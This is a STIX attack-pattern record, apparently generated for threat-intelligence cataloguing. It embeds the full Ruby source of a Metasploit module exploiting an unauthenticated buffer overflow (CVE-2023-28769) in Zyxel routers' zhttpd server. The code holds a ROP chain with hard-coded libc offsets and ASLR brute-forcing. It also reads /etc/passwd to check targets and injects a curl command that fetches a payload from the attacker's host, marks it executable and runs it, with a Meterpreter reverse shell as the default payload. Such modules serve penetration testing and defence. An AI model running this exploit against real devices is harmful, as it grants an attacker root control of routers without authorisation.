{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--057846de-0584-4eb1-9e52-688a592df01a",
    "created": "2024-08-14T16:57:29.147188Z",
    "modified": "2024-08-14T16:57:29.147192Z",
    "name": "Zyxel Unauthenticated LAN Remote Code Execution",
    "description": " This module exploits a buffer overflow in the zhttpd binary (/bin/zhttpd). It is present on more than 40 Zyxel routers and CPE devices. The code execution vulnerability can only be exploited by an attacker if the zhttp webserver is reachable. No authentication is required. After exploitation, an attacker will be able to execute any command as root, including downloading and executing a binary from another host.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/misc/zyxel_multiple_devices_zhttp_lan_rce.rb",
            "external_id": "zyxel_multiple_devices_zhttp_lan_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2023-28769"
        },
        {
            "source_name": "reference",
            "url": "https://r.sec-consult.com/zyxsploit"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'openssl'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::EXE\n  include Msf::Exploit::Remote::HttpServer\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Zyxel Unauthenticated LAN Remote Code Execution',\n        'Description' => %q{\n          This module exploits a buffer overflow in the zhttpd binary (/bin/zhttpd). It is present on more than 40 Zyxel routers and CPE devices.\n          The code execution vulnerability can only be exploited by an attacker if the zhttp webserver is reachable.\n          No authentication is required. After exploitation, an attacker will be able to execute any command\n          as root, including downloading and executing a binary from another host.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Steffen Robertz <s.robertz[at]sec-consult.com>',\n          'Gerhard Hechenberger <g.hechenberger[at]sec-consult.com>',\n          'Thomas Weber <t.weber[at]sec-consult.com>',\n          'Stefan Viehboeck <v.viehboeck[at]sec-consult.com>',\n          'SEC Consult Vulnerability Lab'\n        ],\n        'References' => [\n          [ 'CVE', '2023-28769' ],\n          [ 'URL', 'https://r.sec-consult.com/zyxsploit'],\n        ],\n        'Privileged' => true,\n        'Platform' => 'linux',\n        'Arch' => ARCH_ARMLE,\n        'Payload' => {},\n        'Stance' => Msf::Exploit::Stance::Aggressive,\n        'DefaultOptions' => {\n          'PAYLOAD' => 'linux/armle/meterpreter/reverse_tcp',\n          'WfsDelay' => 15\n        },\n        'Targets' => [\n          [ 'Zyxel Device', {} ]\n        ],\n        'DisclosureDate' => '2022-02-01',\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [CRASH_SERVICE_RESTARTS],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_LOGS]\n        }\n      )\n    )\n    register_options(\n      [\n        Opt::RPORT(80)\n      ]\n    )\n\n    register_advanced_options(\n      [\n        OptInt.new('MAX_WAIT', [true, 'Number of seconds to wait for payload download', 7200])\n      ]\n    )\n  end\n\n  def check\n    res = send_request_raw({\n      'uri' => '/Export_Log?/etc/passwd',\n      'method' => 'GET',\n      'rport' => datastore['RPORT']\n    })\n\n    return CheckCode::Unknown(\"#{peer} - Could not connect to web service - no response\") if res.nil?\n    return CheckCode::Vulnerable if res.to_s['root:x:0:0:']\n\n    return CheckCode::Safe\n  end\n\n  # Handle incoming requests from the router\n  def on_request_uri(cli, _request)\n    if !@payload_sent\n      print_good(\"#{peer} - Sending executable to the router\")\n      print_good(\"#{peer} - A shell should connect soon!\")\n      send_response(cli, @payload_exe)\n      @payload_sent = true\n    end\n  end\n\n  def build_buffer_overflow_url(download_cmd)\n    libc_addr = 0xb6a38000\n\n    system_offset = 0x000376c8\n    system_addr = libc_addr + system_offset\n\n    mov_offset = 0x000f4ccc\n    mov_addr = libc_addr + mov_offset\n\n    r3_offset = 0x0010bdac\n    r3_addr = libc_addr + r3_offset\n\n    sp_inc_offset = 0x000f70ec\n    sp_inc_addr = libc_addr + sp_inc_offset\n\n    overflow_url = rand_text_alpha_lower(268)\n    overflow_url += [r3_addr].pack('I')\n    overflow_url += rand_text_alpha_lower(12)\n    overflow_url += [sp_inc_addr].pack('I')\n    overflow_url += [mov_addr].pack('I')\n    overflow_url += rand_text_alpha_lower(4)\n    overflow_url += [system_addr].pack('I')\n    overflow_url += rand_text_alpha_lower(24)\n    overflow_url += download_cmd\n    return overflow_url\n  end\n\n  def send_exploit(exploit_url)\n    send_request_raw({\n      'uri' => \"/Export_Log?#{exploit_url}\",\n      'method' => 'GET',\n      'rport' => datastore['RPORT']\n    })\n    Rex.sleep(6)\n  end\n\n  def exploit\n    if Rex::Socket.is_ip_addr?(datastore['SRVHOST']) && Rex::Socket.addr_atoi(datastore['SRVHOST']) == 0\n      fail_with(Failure::Unreachable, \"#{peer} - Please specify the LAN IP address of this computer in SRVHOST\")\n    end\n\n    print_status(\"Attempting to exploit #{target.name}\")\n\n    srv_host = datastore['SRVHOST']\n    srv_port = datastore['SRVPORT']\n    @cmd_file = rand_text_alpha_lower(1)\n    payload_file = rand_text_alpha_lower(1)\n\n    # generate our payload executable\n    @payload_exe = generate_payload_exe\n\n    # Command that will download @payload_exe and execute it\n    download_cmd = 'curl${IFS}'\n    if datastore['SSL']\n      # https:// can't be a substring as the zyxel parser won't be able to understand the URI\n      download_cmd += '-k${IFS}https:`echo${IFS}//`'\n    end\n    download_cmd += \"#{srv_host}:#{srv_port}/#{payload_file}${IFS}-o${IFS}/tmp/#{payload_file};chmod${IFS}+x${IFS}/tmp/#{payload_file};/tmp/#{payload_file};\"\n\n    http_service = \"#{srv_host}:#{srv_port}\"\n    print_status(\"Starting up our web service on #{http_service} ...\")\n    start_service({\n      'Uri' => {\n        'Proc' => proc do |cli, req|\n          on_request_uri(cli, req)\n        end,\n        'Path' => \"/#{payload_file}\"\n      }\n    })\n\n    print_status('Going to bruteforce ASLR, this might take a while...')\n\n    count = 1\n    exploit_url = build_buffer_overflow_url(download_cmd)\n    timeout = 0\n    until @payload_sent\n      print_status(\"Trying to overflow the buffer, attempt #{count}\")\n      send_exploit(exploit_url)\n      count += 1\n      timeout += 6\n\n      if timeout == datastore['MAX_WAIT'].to_i\n        fail_with(Failure::Unknown, \"#{peer} - Timeout reached! You were either very unlucky or the device is not vulnerable anymore!\")\n      end\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2022-02-01",
    "x_mitre_platforms": [
        "linux'"
    ]
}